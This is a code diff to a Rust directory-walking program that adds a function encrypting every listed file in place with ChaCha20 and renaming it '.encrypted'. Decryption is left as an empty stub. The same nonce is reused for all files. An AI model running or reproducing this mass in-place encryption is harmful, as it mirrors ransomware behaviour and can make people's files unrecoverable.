@@ -1,7 +1,10 @@
 use std::fs;
 use std::env;
 use std::path::{Path, PathBuf};
+use chacha20poly1305::Nonce;
 use colored::*;
+use encrypt_rust::encryption::encrypt_aes;
+use encrypt_rust::encryption::encrypt_chacha;
 
 pub struct DirInfo { // objeto con dos listas, una para los ficheros vistos y otra con los directorios 
     pub files: Vec<PathBuf>,
@@ -52,6 +55,22 @@ impl DirInfo {
     }
 }
 
+pub fn encrypt_files(dir_info: &DirInfo, key: &[u8; 32], nonce: &[u8; 12]) {
+
+    for file in &dir_info.files {
+        let file_data = fs::read(file).expect("Failed to read file");
+        let encrypted_data = encrypt_chacha(&file_data, key, nonce);
+
+        fs::write(file, &encrypted_data).expect("Failed to write encrypted file");
+        
+        let new_name = file.with_extension("encrypted");
+        fs::rename(file, &new_name).expect("Failed to add the extension");
+    }
+}
+
+pub fn decrypt_files(key: &[u8; 32], nonce: &[u8; 12]) {
+        // Implementar cuando esté la función decrypt
+}
 
 fn main() {
     let args: Vec<String> = env::args().collect();
